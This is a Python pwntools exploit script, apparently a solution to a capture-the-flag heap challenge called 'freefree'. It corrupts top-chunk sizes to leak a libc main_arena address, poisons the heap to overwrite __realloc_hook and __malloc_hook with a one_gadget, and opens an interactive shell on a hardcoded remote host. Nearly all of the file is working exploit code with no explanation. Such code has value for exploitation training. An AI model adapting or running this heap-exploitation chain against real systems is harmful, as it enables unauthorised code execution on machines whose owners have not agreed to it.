import subprocess
import time
from pwn import *

# 0x7f2024da9b80 <main_arena>:	0x0000000000000000

libc = ELF('./libc-2.31.so', checksec=False)
context.binary = exe = ELF('./freefree', checksec=False)
context.log_level = 'debug'
libc.sym['one_gadget'] = 0xe6aee
libc.sym['main_arena'] = 0x1ebbe0

def malloc(var, num):
	p.sendlineafter(b'> ', '{}=malloc({})'.format(var, num).encode())

def gets(var, data):
	p.sendlineafter(b'> ', 'gets({})'.format(var).encode())
	time.sleep(0.1)
	p.sendline(data)

def puts(var):
	p.sendlineafter(b'> ', 'puts({})'.format(var).encode())
	# Receive data outside

def GDB():
	command='''
	b*main+98
	b*main+215
	b*main+226
	b*main+316
	c
	'''
	# b*sysmalloc
	with open('/tmp/command.gdb', 'wt') as f:
	        f.write(command)
	subprocess.Popen(['/usr/bin/x-terminal-emulator', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
	input()         # input() to make program wait with gdb

p = connect('34.136.108.210', 40007)
# p = process('./freefree_patched')


# GDB()
malloc('P', 0x170-0x10)

payload = b'\x00'*(0x170-0x10)
payload += b'\x00'*8
payload += p16(0xc00+1)
gets('P', payload)

malloc('Q', 0x1000)

malloc('R', 0xbe0-0x10)
puts('R')
libc_main_arena = u64(p.recvline()[:-1] + b'\x00\x00')
log.success('Libc main arena: ' + hex(libc_main_arena))
libc.address = libc_main_arena - libc.sym['main_arena']
log.success('Libc base: ' + hex(libc.address))

	

payload = b'\x00'*(0x1000 + 0x8)
payload += p16(0xff1)
gets('Q', payload)

malloc('S', 0xcf0-0x10)
malloc('T', 0x1000)

payload = b'\x00'*(0x1000 + 0x8)
payload += p16(0xff1)
gets('T', payload)

malloc('U', 0xcf0-0x10)
malloc('V', 0x1000)


payload = b'\x00'*(0xcf0-0x8)
payload += p64(0x2e1)
payload += p64(libc.sym['__realloc_hook'])   # __realloc_hook + 8 = __malloc_hook
gets('U', payload)



malloc('W', 0x2e0-0x10)
malloc('W', 0x2e0-0x10)

gets('W', p64(libc.sym['one_gadget']) + p64(libc.sym['__libc_realloc']+24))




malloc('X', 0x40)




p.interactive()